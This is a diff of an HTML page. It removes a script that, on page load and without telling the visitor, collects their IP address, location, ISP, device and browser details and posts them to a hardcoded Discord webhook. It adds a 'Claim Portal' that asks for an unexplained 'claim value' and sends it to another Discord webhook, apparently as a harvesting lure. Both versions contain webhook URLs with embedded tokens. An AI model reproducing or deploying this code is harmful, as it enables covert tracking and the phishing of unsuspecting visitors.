@@ -1,84 +1,133 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Welcome</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Claim Portal</title>
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+    margin: 0;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #101218;
+    color: white;
+    font-family: Arial, sans-serif;
+    padding: 20px;
+}
+
+.container {
+    width: 100%;
+    max-width: 420px;
+    padding: 35px;
+    background: #1b1e27;
+    border-radius: 15px;
+    text-align: center;
+}
+
+p {
+    color: #adb3c2;
+    line-height: 1.6;
+}
+
+input, button {
+    width: 100%;
+    padding: 14px;
+    margin-top: 15px;
+    border-radius: 8px;
+    font-size: 15px;
+}
+
+input {
+    background: #11141b;
+    border: 1px solid #393e4c;
+    color: white;
+}
+
+button {
+    background: #5865f2;
+    border: none;
+    color: white;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+.hidden { display: none; }
+
+#message { margin-top: 15px; }
+</style>
 </head>
+
 <body>
 
+<div class="container">
+
+    <div id="agreement">
+        <h1>Welcome</h1>
+        <p>Click agree to continue to the claim portal.</p>
+        <button onclick="agree()">Agree</button>
+    </div>
+
+    <div id="claimSection" class="hidden">
+        <h1>Claim Portal</h1>
+        <p>Type your claim value inside the text bar and hit Claim.</p>
+
+        <form id="claimForm">
+            <input
+                type="text"
+                id="claimValue"
+                placeholder="Enter your claim value"
+                required
+                autocomplete="off"
+            >
+            <button type="submit">Claim</button>
+        </form>
+
+        <div id="message"></div>
+    </div>
+
+</div>
+
 <script>
-(async () => {
-  const webhook = "https://discord.com/api/webhooks/1569422767403835532/4dL1p7b1EL5YPeUa0gt1fJ1MHc3114odoJ4-VomHRW44YYM2VWxEkOa0iEglfeFoyl43";
 
-  const ua = navigator.userAgent;
-  const platform = navigator.platform;
-  const lang = navigator.language;
-  const screen_res = `${screen.width}x${screen.height}`;
-  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  const time = new Date().toLocaleString();
+// CHANGE YOUR BACKEND URL HERE:
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1569780085249155125/BHWquQlcy9VQ1uEujTWs5IszJb_QXo9h_YZjCeicgUqTNjpX7FyBQbYmjCSe05vpWWId";
 
-  let deviceType = "Desktop";
-  if (/Mobi|Android/i.test(ua)) deviceType = "Mobile";
-  else if (/Tablet|iPad/i.test(ua)) deviceType = "Tablet";
+function agree() {
+    document.getElementById("agreement").classList.add("hidden");
+    document.getElementById("claimSection").classList.remove("hidden");
+}
 
-  let os = "Unknown";
-  if (/Windows/i.test(ua)) os = "Windows";
-  else if (/Mac OS X/i.test(ua)) os = "macOS";
-  else if (/Android/i.test(ua)) os = "Android";
-  else if (/iPhone|iPad/i.test(ua)) os = "iOS";
-  else if (/Linux/i.test(ua)) os = "Linux";
+document.getElementById("claimForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
 
-  let browser = "Unknown";
-  if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
-  else if (/Firefox/i.test(ua)) browser = "Firefox";
-  else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
-  else if (/Edg/i.test(ua)) browser = "Edge";
-  else if (/OPR|Opera/i.test(ua)) browser = "Opera";
+    const value = document.getElementById("claimValue").value.trim();
+    const message = document.getElementById("message");
 
-  let ip = "Unknown";
-  let city = "Unknown";
-  let country = "Unknown";
-  let isp = "Unknown";
-  try {
-    const res = await fetch("https://ipwho.is/");
-    const data = await res.json();
-    ip = data.ip;
-    city = data.city;
-    country = data.country;
-    isp = data.connection?.isp ?? "Unknown";
-  } catch (_) {}
+    if (!value) return;
 
-  const payload = {
-    username: "BRUNO'S FETA PENIS",
-    embeds: [{
-      title: "jävel",
-      color: 0x5865F2,
-      fields: [
-        { name: "Device Type", value: deviceType, inline: true },
-        { name: "OS", value: os, inline: true },
-        { name: "Browser", value: browser, inline: true },
-        { name: "Screen", value: screen_res, inline: true },
-        { name: "Language", value: lang, inline: true },
-        { name: "Timezone", value: timezone, inline: true },
-        { name: "IP Address", value: ip, inline: true },
-        { name: "City", value: city, inline: true },
-        { name: "Country", value: country, inline: true },
-        { name: "ISP", value: isp, inline: true },
-        { name: "Platform", value: platform, inline: true },
-        { name: "Time", value: time, inline: false },
-        { name: "User Agent", value: `\`${ua.slice(0, 200)}\``, inline: false }
-      ],
-      footer: { text: "Visitor log" }
-    }]
-  };
+    try {
+        const response = await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({value: value})
+        });
 
-  await fetch(webhook, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-  });
-})();
+        if (!response.ok) throw new Error("Submission failed");
+
+        message.textContent = "Claim submitted successfully!";
+        document.getElementById("claimValue").value = "";
+
+    } catch (error) {
+        message.textContent = "Could not submit. Please try again.";
+    }
+});
+
 </script>
 
 </body>
